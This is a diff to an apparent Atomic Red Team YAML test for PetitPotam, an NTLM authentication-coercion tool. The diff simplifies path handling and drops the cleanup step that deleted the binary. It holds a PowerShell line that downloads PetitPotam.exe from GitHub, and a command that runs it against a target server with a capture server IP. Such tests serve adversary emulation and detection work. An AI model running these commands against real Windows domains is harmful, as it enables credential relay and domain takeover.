@@ -30,16 +30,12 @@ atomic_tests:
       PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).
       And the computer must be domain joined (implicit authentication).
     prereq_command: |
-      $petitpotam_path = cmd /c echo #{petitpotam_path}
-      if (Test-Path $petitpotam_path) { exit 0 } else { exit 1 }
+      if (Test-Path "#{petitpotam_path}") { exit 0 } else { exit 1 }
     get_prereq_command: |
-      $petitpotam_path = cmd /c echo #{petitpotam_path}
-      Invoke-WebRequest "https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true" -OutFile $petitpotam_path
+      Invoke-WebRequest "https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true" -OutFile "#{petitpotam_path}"
   executor:
     name: powershell
     elevation_required: false
     command: |
       & "#{petitpotam_path}" #{captureServerIP} #{targetServerIP} #{efsApi}
       Write-Host "End of PetitPotam attack"
-    cleanup_command: |
-      Remove-Item #{petitpotam_path}
